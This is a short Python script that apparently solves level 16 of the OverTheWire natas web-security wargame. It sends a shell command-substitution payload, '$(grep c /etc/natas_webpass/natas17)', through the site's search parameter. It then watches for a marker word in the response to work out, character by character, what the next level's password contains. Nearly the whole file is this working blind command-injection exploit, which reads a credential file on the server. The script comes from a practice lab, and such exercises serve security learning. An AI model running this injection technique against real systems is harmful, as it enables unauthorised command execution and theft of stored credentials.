import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas16", "****") # add your own password :P
url = "http://natas16.natas.labs.overthewire.org/"

# Password generator
valid_characters = string.digits + string.ascii_letters
present_characters = ""

# For all of the characters in the possible list
for c in valid_characters:
        # Our payload
        payload = "$(grep " + c + " /etc/natas_webpass/natas17)injection"
        # We need to modify the URL with our payload
        new_url = url + "?needle=" + payload + "&submit=Search"
        response = requests.get(new_url, auth = login, verify = False)
        # We got a hit
        if "injection" not in response.text:
            print("Found: " + c)
            present_characters += c

print("Found following characters: " + present_characters)
